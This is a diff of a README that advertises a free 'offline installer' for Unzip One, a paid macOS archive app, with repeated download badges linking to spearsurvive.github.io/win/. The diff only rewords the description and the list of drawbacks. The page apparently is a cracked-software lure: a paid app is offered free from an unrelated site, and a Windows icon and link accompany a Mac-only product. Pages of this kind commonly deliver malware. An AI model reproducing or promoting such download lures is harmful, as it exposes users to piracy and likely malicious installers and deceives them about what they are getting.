@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Archive+Manager-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Unzip One Free Installer** — Unzip One is a macOS archive extraction utility that unzips compressed files with a double-click, automatically handling ZIP, RAR, 7Z, TAR, and other formats. Works without internet access, no account required. Full offline installation.
+**💻 Unzip One Free Installer** — Unzip One is a macOS archive extraction application that provides a clean, minimal interface for extracting ZIP, RAR, 7-Zip, TAR, and other compressed file formats. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip%20One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip+One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Unzip One
 
-Unzip One is a macOS archive extraction utility that unzips compressed files with a double-click, automatically handling ZIP, RAR, 7Z, TAR, and other formats. It provides a clean, simple extraction experience without configuration.
+Unzip One is a macOS archive extraction application that provides a clean, minimal interface for extracting ZIP, RAR, 7-Zip, TAR, and other compressed file formats. With drag-and-drop support and automatic extraction to sensibly named folders, Unzip One makes archive extraction simple and uncluttered. It targets Mac users who want clean archive handling beyond macOS's built-in ZIP support.
 
 ---
 
 ## ❌ Problem: Unzip One is hard to access
 
-- **macOS Only** — Not needed on Windows which handles ZIP natively
-- **Basic Functionality** — Extraction only; cannot create archives
-- **Competition** — The Unarchiver is free and handles more formats
-- **Paid App** — Requires purchase from Mac App Store
+- **macOS Only** — macOS-specific archive tool
+- **Limited Creation** — Focus on extraction; archive creation features limited
+- **Format Coverage** — Less comprehensive than full archive managers for exotic formats
+- **Commercial License** — Paid application from the Mac App Store
 
 ---
 
@@ -81,7 +81,7 @@ Unzip One is a macOS archive extraction utility that unzips compressed files wit
 
 <div align="center">
 
-[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip%20One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip+One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Unzip One is a macOS archive extraction utility that unzips compressed files wit
 
 ---
 
-**Unzip One Free Installer** — Unzip One is a macOS archive extraction utility that unzips compressed files with a double-click, automatically handling ZIP, RAR, 7Z, TAR, and other formats. Install without internet connection today!
+**Unzip One Free Installer** — Unzip One is a macOS archive extraction application that provides a clean, minimal interface for extracting ZIP, RAR, 7-Zip, TAR, and other compressed file formats. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip%20One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Unzip One](https://img.shields.io/badge/⬇_Install_Unzip+One-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
